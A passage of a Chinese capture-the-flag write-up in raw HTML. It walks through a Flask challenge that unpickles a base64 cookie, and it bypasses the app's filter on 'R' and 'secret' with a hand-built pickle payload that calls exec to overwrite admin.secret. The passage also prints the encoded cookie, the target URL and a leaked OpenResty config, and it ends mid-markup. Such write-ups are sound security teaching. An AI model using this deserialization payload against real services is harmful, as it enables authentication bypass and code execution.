#89DDFF\">=[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">GET</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">POST</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">])</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">flag</span><span style=\"color: #89DDFF\">():</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    pickle_data</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">base64</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">b64decode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">request</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">cookies</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">userdata</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">))</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">b</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">R</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">in</span><span style=\"color: #BABED8\"> pickle_data </span><span style=\"color: #89DDFF\">or</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">b</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">secret</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">in</span><span style=\"color: #BABED8\"> pickle_data</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">You damm hacker!</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    os</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">system</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">rm -rf *py*</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    userdata</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\">pickle</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">loads</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">pickle_data</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> userdata</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">token</span><span style=\"color: #89DDFF\">!=</span><span style=\"color: #82AAFF\">hash</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">get_password</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">userdata</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">username</span><span style=\"color: #89DDFF\">)):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">         </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Login First</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> userdata</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">username</span><span style=\"color: #89DDFF\">==</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">admin</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Welcome admin, here is your next challenge!</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">You&#39;re not admin!</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">@</span><span style=\"color: #82AAFF\">app</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">route</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">/login</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #BABED8; font-style: italic\">methods</span><span style=\"color: #89DDFF\">=[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">GET</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">POST</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">])</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">login</span><span style=\"color: #89DDFF\">():</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    resp </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">make_response</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">success</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    session</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">password</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">]=</span><span style=\"color: #BABED8\">request</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">values</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">password</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    resp</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">set_cookie</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">userdata</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> base64</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">b64encode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">pickle</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">dumps</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">User</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">request</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">values</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">username</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">),</span><span style=\"color: #82AAFF\">request</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">values</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">password</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)),</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">)),</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #BABED8; font-style: italic\">max_age</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">3600</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> resp</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">@</span><span style=\"color: #82AAFF\">app</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">route</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">/</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #BABED8; font-style: italic\">methods</span><span style=\"color: #89DDFF\">=[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">GET</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">POST</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">])</span></span>\n<span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">index</span><span style=\"color: #89DDFF\">():</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">open</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">source.txt</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">r</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">).</span><span style=\"color: #82AAFF\">read</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> __name__ </span><span style=\"color: #89DDFF\">==</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">__main__</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    app</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">run</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8; font-style: italic\">host</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">0.0.0.0</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #BABED8; font-style: italic\">port</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">5000</span><span style=\"color: #89DDFF\">)</span></span></code></pre></div><p>登陆 <code>admin</code> ，用户名和密码通过 <code>GET</code> 传参。经过序列化操作和 <code>base64</code> 编码后放到 <code>cookie</code> 里</p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">login</span><span style=\"color: #89DDFF\">():</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    resp </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">make_response</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">success</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    session</span><span style=\"color: #89DDFF\">[</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">password</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">]=</span><span style=\"color: #BABED8\">request</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">values</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">password</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    resp</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">set_cookie</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">userdata</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #82AAFF\"> base64</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">b64encode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">pickle</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">dumps</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">User</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">request</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">values</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">username</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">),</span><span style=\"color: #82AAFF\">request</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">values</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">get</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">password</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">)),</span><span style=\"color: #F78C6C\">2</span><span style=\"color: #89DDFF\">)),</span><span style=\"color: #82AAFF\"> </span><span style=\"color: #BABED8; font-style: italic\">max_age</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #F78C6C\">3600</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> resp</span></span></code></pre></div><p>我们发现 <code>admin</code> 的密码是本地变量 <code>secret</code> ，但是不知道 <code>secret</code> 的值是多少</p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C792EA\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">get_password</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8; font-style: italic\">username</span><span style=\"color: #89DDFF\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> username</span><span style=\"color: #89DDFF\">==</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">admin</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> admin</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #F07178\">secret</span></span></code></pre></div><p>我们可以通过 <code>pickle</code> 反序列化实现 <code>变量覆盖</code> ，注意传入的序列化字符串中不能出现 <code>R</code> 和 <code>secret</code> </p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">b</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">R</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">in</span><span style=\"color: #BABED8\"> pickle_data </span><span style=\"color: #89DDFF\">or</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">b</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">secret</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">in</span><span style=\"color: #BABED8\"> pickle_data</span><span style=\"color: #89DDFF\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">You damm hacker!</span><span style=\"color: #89DDFF\">&quot;</span></span></code></pre></div><p>我们使用双层 <code>exec</code> 绕过</p>\n<div class=\"language-python\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">python</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #89DDFF; font-style: italic\">import</span><span style=\"color: #BABED8\"> base64</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">data </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">b</span><span style=\"color: #89DDFF\">&#39;&#39;&#39;</span><span style=\"color: #C3E88D\">(S&#39;exec(&#39;admin.se&#39;+&#39;cret=&quot;admin&quot;&#39;)&#39;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">i__builtin__</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">exec</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">.</span><span style=\"color: #89DDFF\">&#39;&#39;&#39;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #82AAFF\">print</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">base64</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">b64encode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #82AAFF\">data</span><span style=\"color: #89DDFF\">))</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg==</span></span></code></pre></div><p>此时页面显示成功</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">http://39.107.237.149:25512/login?username</span><span style=\"color: #BABED8\">=admin</span><span style=\"color: #89DDFF\">&amp;</span><span style=\"color: #BABED8\">password</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">admin</span></span></code></pre></div><p>此时访问 <code>/balancer</code> 会提示 <code>You&#39;re not admin!</code>，我们修改一下 <code>cookie</code>再去请求<code>/balancer</code></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">userdata</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">KFMnZXhlYygnYWRtaW4uc2UnKydjcmV0PSJhZG1pbiInKScKaV9fYnVpbHRpbl9fCmV4ZWMKLg==</span></span></code></pre></div><p>请求后页面提示 <code>500</code> ，重新请求一次即可返回正常页面。<br><img src=\"/./images/12.png\" alt=\"12\"></p>\n<p>这里又提示 <code>flag in 504 page</code> ，所以说这个页面应该是最终得到能flag页面</p>\n<p>然后还给了一个 <code>/826fd2f86129b050875e4a70cb059908a7ed</code>  我们直接构造请求一下</p>\n<p><img src=\"/./images/13.png\" alt=\"13\"></p>\n<p>访问后得到一个 <code>nginx</code> 配置文件</p>\n<div class=\"language-nginx\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">nginx</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># nginx.vh.default.conf  --  docker-openresty</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># This file is installed to:</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#   `/etc/nginx/conf.d/default.conf`</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># It tracks the `server` section of the upstream OpenResty&#39;s `nginx.conf`.</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># This config (and any other configs in `etc/nginx/conf.d/`) is loaded by</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># default by the `include` directive in `/usr/local/openresty/nginx/conf/nginx.conf`.</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># See https://github.com/openresty/docker-openresty/blob/master/README.md#nginx-config-files</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">lua_package_path</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">&quot;/lua-resty-balancer/lib/?.lua;;&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">lua_package_cpath</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">&quot;/lua-resty-balancer/?.so;;&quot;</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C792EA\">server</span><span style=\"color: #BABED8\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\"> listen </span><span style=\"color: #BABED8\">      </span><span style=\"color: #F78C6C\">8088</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">   </span><span style=\"color: #89DDFF\"> server_name </span><span style=\"color: #BABED8\"> localhost</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#charset koi8-r;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#access_log  /var/log/nginx/host.access.log  main;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #C792EA\">location</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">/gettestresult </span><span style=\"color: #BABED8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">           </span><span style=\"color: #89DDFF\"> default_type </span><span style=\"color: #BABED8\">text/html</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #C792EA\">content_by_lua</span><span style=\"color: #BABED8\"> &#39;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF\">local</span><span style=\"color: #BABED8\"> resty_roundrobin </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">require</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">resty.roundrobin</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF\">local</span><span style=\"color: #BABED8\"> server_list </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> &#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    [ngx.</span><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\">.</span><span style=\"color: #FFCB6B\">arg_server1</span><span style=\"color: #BABED8\">] </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> ngx.</span><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\">.</span><span style=\"color: #FFCB6B\">arg_weight1</span><span style=\"color: #BABED8\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    [ngx.</span><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\">.</span><span style=\"color: #FFCB6B\">arg_server2</span><span style=\"color: #BABED8\">] </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> ngx.</span><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\">.</span><span style=\"color: #FFCB6B\">arg_weight2</span><span style=\"color: #BABED8\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    [ngx.</span><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\">.</span><span style=\"color: #FFCB6B\">arg_server3</span><span style=\"color: #BABED8\">] </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> ngx.</span><span style=\"color: #FFCB6B\">var</span><span style=\"color: #BABED8\">.</span><span style=\"color: #FFCB6B\">arg_weight3</span><span style=\"color: #BABED8\">,</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                &#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF\">local</span><span style=\"color: #BABED8\"> rr_up </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">resty_roundrobin</span><span style=\"color: #BABED8\">:</span><span style=\"color: #82AAFF\">new</span><span style=\"color: #BABED8\">(server_list)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> i </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">0</span><span style=\"color: #BABED8\">,</span><span style=\"color: #F78C6C\">9</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">do</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    ngx.</span><span style=\"color: #82AAFF\">say</span><span style=\"color: #BABED8\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">Server seleted for request </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">,i,</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">: &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><span style=\"color: #89DDFF\">&quot; </span><span style=\"color: #BABED8\">,</span><span style=\"color: #FFCB6B\">rr_up</span><span style=\"color: #BABED8\">:</span><span style=\"color: #82AAFF\">find</span><span style=\"color: #BABED8\">(),</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">&lt;br&gt;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">end</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            &#39;;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#error_page  404              /404.html;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\"># redirect server error pages to the static page /50x.html</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\"># proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#location ~ \\.php$ &#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#    proxy_pass   http://127.0.0.1;</span></span>\n<span 